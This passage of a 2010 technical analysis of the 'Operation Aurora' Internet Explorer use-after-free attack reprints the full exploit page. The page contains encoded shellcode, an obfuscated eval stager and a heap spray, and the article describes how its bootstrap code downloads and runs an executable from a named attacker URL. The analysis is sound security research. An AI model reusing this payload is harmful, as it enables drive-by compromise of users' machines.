+  it to be looking. The attacker who gets this far has made a really good start. 
+  Problems remain of what to store at the target address and how to get it there, 
+  but these are relatively easy. </p>
+  <p>To see what would be useful at the target address, whatever may yet be chosen 
+  for that address, consider what the program must be looking for if exploitation 
+  is to be possible. The attacker hopes that the program is looking for a pointer 
+  to a function, or at least to a pointer to other memory where the program may 
+  in turn look for a pointer to a function: in general then, a chain of pointers, 
+  possibly each with an offset, ending with a pointer to a function. The easiest 
+  way to catch this generality is to make the chain circular, as long as there’s 
+  an exit. Allowing for offsets at each pointer in the chain, the attacker will 
+  want to put at the target address an array of pointers to the target address. 
+  When the program reaches the end of the chain and follows what it thinks is a 
+  pointer to a function, it will start executing at the target address and thus 
+  try executing the array of pointers as if they are the opcode bytes of CPU instructions. 
+  If the attacker can find a target address whose repetition makes for a meaningful 
+  opcode sequence, he has his second goal: the program is now executing his choice 
+  of code. </p>
+  <p>Inspection of the x86 opcode tables shows numerous sequences that don’t exactly 
+  do nothing but which don’t do very much. What counts as not very much for the 
+  attacker is very broad since he does not care what changes are made to the CPU’s 
+  general registers. Pretty much any instruction sequence that doesn’t risk a CPU 
+  fault by trying to access memory will do. The attacker can let this sequence execute 
+  repeatedly for as long as he wants for his array, and then follow with the code 
+  that he really does want to execute, i.e., his bootstrap code for the attack.
+  </p>
+  <p>The first candidate in the x86 opcode tables is 00 C0, which just adds the
+  <span class="register">al</span> register to itself. However, this sequence corresponds 
+  to a target address of C000C000. On Windows, this address is necessarily outside 
+  the user-mode address space. This brings us to the attacker’s last concern: he 
+  needs a target address that offers a realistic chance of being able to get the 
+  pointer array stored there. The next candidate in the opcode tables is 04
+  <span class="placeholder">xx</span>. This just adds the byte
+  <span class="placeholder">xx</span> to the <span class="register">al</span> register. 
+  The corresponding target address is <span class="placeholder">xx</span>04<span class="placeholder">xx</span>04. 
+  This is a good candidate since it (and many similar) can be adjusted to suit whatever 
+  turns out to be possible as an address that the attacker can store at. All the 
+  attacker has to do is choose a large enough <span class="placeholder">xx</span> 
+  so that the corresponding target address is greater than any that is ever seen 
+  at the lower end of the user-mode address space in typical usage. Though DLLs 
+  are loaded near the top of the user-mode address space, memory for the program’s 
+  data requirements tends to be allocated upwards. The attacker can prepare a large 
+  pointer array followed by bootstrap code, as one block, and then get the program 
+  to store this block as many times as needed until the new allocations reach the 
+  target address. If the bootstrap code is neglibly small relative to the pointer 
+  array, then it is almost certain that where the target address is contained within 
+  one of these newly added blocks, it will fall in the pointer array, as wanted. 
+  The attacker has all that’s needed to exploit the use-after-free bug, and has 
+  not needed to understand the particular bug in any sort of detail. </p>
+  <h3>The “Operation Aurora” Exploitation </h3>
+  <p>Now that we have the theory for a brute-force exploitation, we may usefully 
+  look at the HTML code that is supposed to have been used in the attacks reported 
+  by Google. As noted, the published code cannot actually be correct, not that this 
+  has stopped it being reproduced in what are said to be analyses. I have cleaned 
+  it up very slightly: </p>
+  <pre class="source">&lt;html&gt;
+
+&lt;head&gt;
+&lt;script&gt;
+
+var sc = unescape(&quot;%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8db%u87d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%u9e53%u30d4%uda37%ud8d8%u3053%ud9b2%u3081%udbb9%ud8d8%u213a%ub7b0%ud8b6%ub0d8%uaaad%ub5b4%u538c%ud49e%u0830%ud8da%u53d8%ub230%u81d9%u9a30%ud8db%u3ad8%ub021%uebb4%ud8ea%uabb0%ubdb0%u8cb4%u9e53%u30d4%uda69%ud8d8%u3053%ud9b2%u3081%udbfb%ud8d8%u213a%u3459%ud9d8%ud8d8%u0453%u1b59%ud858%ud8d8%ud8b2%uc2b2%ub28b%u27d8%u9c8e%u18eb%u5898%udbe4%uadd8%u5121%u485e%ud8d8%u1fd8%udbdc%ub984%ubdf6%u9c1f%udcdb%ubda0%ud8d8%u11eb%u8989%u8f8b%ueb89%u5318%u989e%u8630%ud8da%u5bd8%ud820%u5dd7%ud9a7%ud8d8%ud8b2%ud8b2%udbb2%ud8b2%udab2%ud8b0%ud8d8%u8b18%u9e53%u30fc%udae5%ud8d8%u205b%ud727%u865c%ud8d9%u51d8%ub89e%ud8b2%u2788%uf08e%u9e51%u53bc%u485e%ud8d8%u1fd8%udbdc%uba84%ubdf6%u9c1f%udcdb%ubda0%ud8d8%ud8b2%ud8b2%udab2%ud8b2%ud8b2%ud8b0%ud8d8%u8b98%u9e53%u30fc%ud923%ud8d8%u205b%ud727%uc45c%ud8d9%u51d8%u5c5e%ud8d8%u51d8%u5446%ud8d8%u53d8%ub89e%ud8b2%ud8b2%ud8b2%u9e53%u88b8%u8e27%u1fe0%ua89e%ud8d8%ud8d8%u9e1f%ud8ac%ud8d8%u59d8%ud81f%ud8da%uebd8%u5303%ubc86%ud8b2%u9e55%u88a8%ud8b0%ud8dc%u8fd8%uae27%u27b8%udc8e%u11eb%ud861%ud8dc%u58d8%ud7a4%u4d27%ud4ac%ua458%u27d7%uacd8%u58dd%ud7ac%u4d27%u333a%u1b53%ud8f5%ud8dc%u5bd8%ud820%udba7%u8651%ub2a8%u55d8%uac9e%u2788%ua8ae%u278f%u5c6e%ud8d8%u27d8%ue88e%u3359%udcd8%ud8d8%u235b%ua7d8%u277d%ub8ae%u8e27%u27ec%u5c6e%ud8d8%u27d8%uec8e%u5e53%ud848%ud8d8%u4653%ud854%ud8d8%udc1f%u84db%uf6b9%u8bbd%u8e27%u53f4%u5466%ud8d8%u53d8%u485e%ud8d8%u1fd8%udfdc%uba84%ubdf6%u3459%ud9d8%ud8d8%u0453%ud8b0%ud8d9%u8bd8%ud8b0%ud8d9%u8fd8%ud8b2%ud8b2%u8e27%u53c4%ueb23%ueb18%u5903%ud834%ud8da%u53d8%u5b14%u8c20%ud0a5%uc451%u5bd9%udc18%u2b33%u1453%u0153%u1b5b%uebc8%u8818%u8b89%u8888%u8888%u8888%u888f%u5388%ud09e%u2f30%ud8d8%u53d8%ue4a6%uec30%ud8d9%u30d8%ud8ef%ud8d8%ubbb0%uafae%ub0d8%ub0ab%ub7bc%u538c%ud49e%u6e30%ud8d8%u51d8%ue49e%u79bc%ud8dc%ud8d8%u7855%u27b8%u2727%ubdb2%uae27%u53e4%uc89e%u4230%ud8d8%uebd8%u8b03%u8b8b%u278b%u3008%ud83d%ud8d8%u3459%ud9d8%ud8d8%u2453%u1f5b%u1fdc%ueadf%u49ac%u1fd4%udc9f%u51bb%u9709%u9f1f%u78d0%u4fbd%u1f13%ud49f%u9889%ua762%u9f1f%ue6c8%u6ec5%u1fe1%ucc9f%ub160%uc30c%u9f1f%u66c0%ubea7%u1f78%uc49f%u7124%u75ef%u9f1f%u40f8%uc8d2%ubc20%ue879%ud8d8%u53d8%ud498%ua853%u75c4%ub053%u53d0%u512f%ubc8e%udcb2%u3081%ud87b%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%ude53%uca30%ud8d8%u53d8%ub230%u81dd%u5c30%ud8d8%u3ad8%ueb21%u8f27%u8e27%u58dc%u30e0%ue058%uad31%u59c9%udda0%u4848%u4848%ud0ac%u2753%u538d%u5534%udd98%u3827%ue030%ud8d8%u1bd8%ue058%u5830%u31e0%uc9ad%ua059%u48dd%u4848%uac48%ub03f%ud2d0%ud8d8%u9855%u27dd%u3038%ud8cf%ud8d8%u301b%ud8c9%ud8d8%uc960%udcd9%u1a58%ud8d4%uda33%u1b80%u2130%u2727%u8327%udf1e%u5160%ud987%u1fbe%udd9f%u3827%u8b1b%u0453%ub28b%ub098%uc8d8%ud8d8%u538f%uf89e%u5e30%u2727%u8027%u891b%u538e%ue4ad%uac53%ua0f6%u2ddb%u538e%uf8ae%u2ddb%u11eb%u9991%udb75%ueb1d%ud703%uc866%u0ee2%ud0ac%u1319%udbdf%u9802%u2933%uc7e3%u3fad%u5386%ufc86%u05db%u53be%u93d4%u8653%udbc4%u5305%u53dc%u1ddb%u8673%u1b81%uc230%u2724%u6a27%u3a2a%u6a2c%ud7ee%u28cb%ua390%ueae5%u49ac%u5dd4%u7707%ubb63%u0951%u8997%u6298%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342%ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8&quot;);
+
+var sss = Array (826, 679, 798, 224, 770, 427, 819, 770, 707, 805, 693, 679, 784, 707, 280, 
+238, 259, 819, 336, 693, 336, 700, 259, 819, 336, 693, 336, 700, 238, 287, 413, 224, 833, 
+728, 735, 756, 707, 280, 770, 322, 756, 707, 770, 721, 812, 728, 420, 427, 371, 350, 364, 
+350, 392, 392, 287, 224, 770, 301, 427, 770, 413, 224, 770, 427, 770, 322, 805, 819, 686, 
+805, 812, 798, 735, 770, 721, 280, 336, 448, 371, 350, 364, 350, 378, 399, 315, 805, 693, 
+322, 756, 707, 770, 721, 812, 728, 287, 413, 826, 679, 798, 224, 840, 427, 770, 707, 833, 
+224, 455, 798, 798, 679, 847, 280, 287, 413, 224, 714, 777, 798, 280, 826, 679, 798, 224, 
+735, 427, 336, 413, 735, 420, 350, 336, 336, 413, 735, 301, 301, 287, 224, 861, 840, 637, 
+735, 651, 427, 770, 301, 805, 693, 413, 875);
+
+var arr = new Array;
+for (var i = 0; i &lt; sss.length; i ++) {
+    arr[i] = String.fromCharCode (sss [i] / 7);
+} 
+
+var cc = arr.toString ();
+cc = cc.replace (/,/g, &quot;&quot;);
+cc = cc.replace (/@/g, &quot;,&quot;);
+eval (cc);
+
+var x1 = new Array ();
+for (i = 0; i &lt; 200; i ++) {
+    x1 [i] = document.createElement (&quot;COMMENT&quot;);
+    x1 [i].data = &quot;abc&quot;;
+}; 
+
+var e1 = null;
+
+function ev1 (evt)
+{
+    e1 = document.createEventObject (evt);
+    document.getElementById (&quot;sp1&quot;).innerHTML = &quot;&quot;;
+    window.setInterval (ev2, 50);
+}
+
+function ev2 ()
+{
+    p = &quot;\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d&quot;;
+    for (i = 0; i &lt; x1.length; i ++) {
+        x1 [i].data = p;
+    };
+    var t = e1.srcElement;
+}
+
+&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;span id=&quot;sp1&quot;&gt;&lt;IMG SRC=&quot;aaa.gif&quot; onload=&quot;ev1(event)&quot; width=&quot;16&quot; height=&quot;16&quot;&gt;&lt;/span&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;</pre>
+  <p>Look first at the use of <span class="method">createEventObject</span> in the 
+  event handler <span class="function">ev1</span>. The event is an
+  <span class="event">onload</span> from an <span class="htmlelement">img</span> 
+  element in the <span class="htmlelement">body</span>. As in the minimal demonstration 
+  given earlier, the event handler saves the created <span class="object">event</span> 
+  object (as <span class="variable">e1</span>) and then removes the event’s source 
+  element from the DOM tree. A callback <span class="function">ev2</span> is then 
+  arranged so that more script gets to run after the event has been handled. That 
+  much should be familiar by now as setting up the bug. The callback ends with the 
+  bug being triggered. All the rest of the script is for exploiting the bug. </p>
+  <p>The script from the beginning until the use of the JScript function
+  <span class="function">eval</span> is where the attacker gets Internet Explorer 
+  to store what the attacker wants at the chosen target address. The script is a 
+  little obfuscated, but its effect is build an array of 200 members which each 
+  consist of the bytes for a large pointer array followed by the bootstrap code 
+  which is provided as the <span class="variable">sc</span> variable. The target 
+  address for each pointer is 0C0D0C0D. Each member is set as a string literal of 
+  512K Unicode characters. Thus, Internet Explorer is made to find 200 memory blocks 
+  of 1MB each. Assuming upwards allocation from low memory, this is a little more 
+  than should be needed so that one of the blocks contains the target address.
+  </p>
+  <div class="Digression"><div class="Box">
+    <p>That the 
+    particular target address for this attack is unaligned is perhaps a coding error 
+    by the attacker. Not that there’s much consequence to it in practice, but it 
+    means that the pointer arrays must cover two addresses rather than one: 0C0D0C0D 
+    and 0D0C0D0C. </p></div></div>
+  <p>The setup part to a successful brute-force exploitation is much the more difficult 
+  in practice. Some time after the node is erroneously freed but before it is accessed, 
+  the attacker must flood the heap’s free space with pointers to the target address 
+  in the hope that the memory that used to hold the node (and which MSHTML still 
+  thinks holds the node) will now get overwritten with the attacker’s pointers. 
+  This is the idea behind building the array <span class="variable">x1</span> before 
+  the event and modifying it in the callback. Presumably in the hope that MSHTML 
+  uses the same area of memory all the while that it works with elements and nodes, 
+  the array is built as a collection of HTML elements. The callback function sets 
+  new values for a simple property of each element. The new value is supplied as 
+  a string but is equivalently an array of pointers to the target address. Although 
+  the attacker can’t control where MSHTML stores the new values, the hope is that 
+  one of them will just happen to overwrite the memory that had been used for the 
+  freed node. </p>
+  <p>Note, by the way, that the attackers seem not to have very much idea why the 
+  setup part of their attack should work. All other things being equal, you would 
+  expect that the optimum size to write in the hope of overwriting a freed node 
+  would be the size of the node. If you write more, you risk that the heap manager 
+  allocates from a different heap segment (for bigger blocks) or anyway can’t allocate 
+  where you want because memory both before and after the freed node remains allocated. 
+  For most MSHTML versions, each <span class="class">CTreeNode</span> is 0x30 bytes, 
+  rising to 0x4C in version 8.0. Yet the attackers write 0x54 bytes. </p>
+  <h3>Evaluation </h3>
+  <p>The setup part of the exploitation works very successfully for MSHTML version 
+  6.0, but markedly less well in version 7.0 and higher. The difference is explained 
+  entirely by a change of heap manager. </p>
+  <p>MSHTML version 6.0 has its own small-block heap, similar to the one in the 
+  C Run-Time Library (CRT), for blocks that are smaller than 0x0230 bytes. The process 
+  heap is used only for larger blocks. One practical consequence is that requests 
+  for small heap blocks by MSHTML version 6.0 are met from an area of memory that 
+  is used only by MSHTML. Since MSHTML has nothing much to do except interpret the 
+  script, the node that was freed after handling the event will very likely still 
+  be free for the callback. The attacker’s hope expressed above is sound for MSHTML 
+  version 6.0. </p>
+  <p>MSHTML version 7.0 changes this by using the process heap whatever the size 
+  of block. Where script hopes to set new contents for memory that previously held 
+  a node, it now has to compete with all the other users of memory in the whole 
+  of Internet Explorer, i.e., with all the other DLLs, executing in all the other 
+  threads. A lot happens throughout Internet Explorer between the “execution” of 
+  one script statement and the next, and the attacker can’t control this. The memory 
+  that held the erroneously freed node will much less likely be still free for the 
+  callback. Even if it is, the heap manager may by then be allocating from a different 
+  area of memory. The brute-force attempt to overwrite the freed node with pointers 
+  to the target address can only rarely succeed. </p>
+  <p>This is not to say that no variation exists that works occasionally, and perhaps 
+  even more often than not, with later MSHTML versions, but it is to say that MSHTML’s 
+  change of heap manager makes it much harder to design a brute-force attack in 
+  script that can expect much success at inducing MSHTML to try executing the attacker’s 
+  code. Whether Microsoft had security in mind when changing the heap manager is 
+  anyone’s guess, but if they did, they’ve been quiet about it when describing why 
+  Internet Explorer 7 and 8 are less susceptible. </p>
+  <p>By the way, where Microsoft’s Security Bulletin for the bug fix talks of Address 
+  Space Layout Randomization (ASLR), what’s said is not wrong—it may protect against 
+  variant attacks that would exploit this same bug—but it is not the slightest bit 
+  applicable to this particular exploitation. It’s only a small point in this case, 
+  but the wider question is whether the public interest is well served if a software 
+  manufacturer’s default response might be to promote security features without 
+  checking that they actually do apply. </p>
+  <p>It’s more than merely odd that an attack at the end of 2009 depends on exploitation 
+  code that experiments readily show to be far more successful on Internet Explorer 
+  versions from three and more years before. The attackers must have known they 
+  had next to no chance of success except with users of Internet Explorer 6. Were 
+  they content with this because they could determine which browsers are used by 
+  potential targets and found that Internet Explorer 6 is used by enough of these 
+  targets to make the attack worthwhile? Without such intelligence about their targets, 
+  why even think to attack Google, which makes its own browser, such that few staff 
+  are likely to use any version of Internet Explorer let alone an old one? </p>
+  <h2>The Bootstrap Code </h2>
+  <p>Having got control of Internet Explorer’s execution, the attacker can do pretty 
+  much anything but is limited at first because only so much code can sensibly be 
+  included with the exploitation itself. In practice then, the exploitation arranges 
+  to execute a relatively small amount of bootstrap code. The job of this code is 
+  just to load something larger, typically from a server on the Internet, and to 
+  get it running as a program on your computer. What happens after that could be 
+  anything—literally, because the attackers control the server that responds to 
+  the bootstrap code’s requests for a program to download. They can vary this as 
+  they like: the program seen by one observer does not have to be the same as downloaded 
+  to another. </p>
+  <p>The bootstrap code supplied with the reported attack, i.e., with the HTML page 
+  reported on the Wepawet website, has a hard-coded URL from which to download one 
+  file and has a simple notion of where to download this file to: </p>
+  <table>
+    <tr>
+      <td>Source: </td>
+      <td>http://demo1.ftpaccess.cc/demo/ad.jpg </td>
+    </tr>
+    <tr>
+      <td>Destination: </td>
+      <td><span class="placeholder">AppData</span>\a.exe </td>
+    </tr>
+  </table>
+  <p>Here, <span class="placeholder">AppData</span> represents the shell folder 
+  denoted by <span class="constant">CSIDL_APPDATA</span>. This will typically be
+  </p>
+  <ul>
+    <li>“C:\Users\<span class="placeholder">username</span>\AppData\Roaming” in 
+    Windows Vista; </li>
+    <li>“C:\Documents and Settings\<span class="placeholder">username</span>\Application 
+    Data” in earlier versions. </li>
+  </ul>
+  <p>Despite the names, this downloaded file is not expected to be either a picture 
+  file or an executable. All that the bootstrap code knows about this file is that 
+  it should be an executable that has been disguised, such that an XOR by 0x95 is 
+  needed for every byte that is not already 0x95 or 0x00. The decrypted file is 
+  rewritten as “b.exe” in the same directory, the “a.exe” file is deleted, and the 
+  “b.exe” file is executed. It can be whatever the attacker chooses to send. </p>
+  <p>Whether the file downloads or not, the bootstrap code tries to keep the Internet 
+  Explorer process alive. The code cannot put right the problems that led to its 
+  being executed. Instead, it tries to restart Internet Explorer’s execution—within 
+  its current process, not as a new process—by calling the
+  <span class="function">IEWinMain</span> function, as exported by SHDOCVW.DLL. 
+  Perhaps to cover for this not working, the bootstrap code first patches the USER32 
+  function <span class="function">MessageBeep</span> with the effect that execution 
+  of this function, presumably to indicate an error, will terminate the process.
+  </p>
+  <p>This attempt to restart Internet Explorer by calling <span class="function">
+  IEWinMain</span> is suspect not just for whether it is reliable in principle but 
+  also for the details of how this particular code attempts it. For instance, although 
+  the code uses the <span class="member">StackBase</span> member at offset 0x04 
+  in the <span class="register">fs</span> segment to determine where to restore 
+  the stack pointer to match (roughly) what this function would expect in ordinary 
+  circumstances, it does nothing for the <span class="member">ExceptionList</span> 
+  at offset 0x00 in the <span class="register">fs</span> segment. Even an exception 
+  that Internet Explorer expects to handle will then cause trouble. </p>
+  <p>Most interesting however is that the coding does not account for important 
+  changes introduced for Internet Explorer 7 (and Windows Vista). In these versions, 
+  the essence of Internet Explorer is not SHDOCVW but IEFRAME (which cuts large 
+  tracts from the old SHDOCVW and BROWSEUI, and copies much from SHLWAPI). If the 
+  bootstrap code means to keep Internet Explorer running, the
+  <span class="function">IEWinMain</span> that it would need to call is the one 
+  in IEFRAME. Though SHDOCVW continues to export an <span class="function">IEWinMain</span> 
+  function, it is just a forward to a stub in SHUNIMPL.DLL for trivial failure. 
+  That this might not be known to any supposed author of this code in 2009 is scarcely 
+  credible. Either this code was written in 2009 explicitly for execution on Internet 
+  Explorer 6 or this code actually does predate Internet Explorer 7. Whichever is 
+  true, both ought give the security industry pause for thought. </p>
+  <div class="Footer">
+    <p class="Dates">This page was created on 18th January 2010 and was last modified 
+    on 11th December 2011 (except for slight restyling, especially of what had been 
+    footnotes, on 3rd April 2021). </p>
+    <!--webbot bot="Include" U-Include="../../_include/c1011.htm" TAG="BODY" startspan -->
+
+<p class="Copyright">Copyright © 2010-2011. Geoff Chappell. All rights reserved. 
+<a href="../../../about/terms.htm">Conditions apply</a>. </p>
+
+<!--webbot bot="Include" endspan i-checksum="50709" -->
+  </div>
+</div>
+
+</body>
+
+</html>
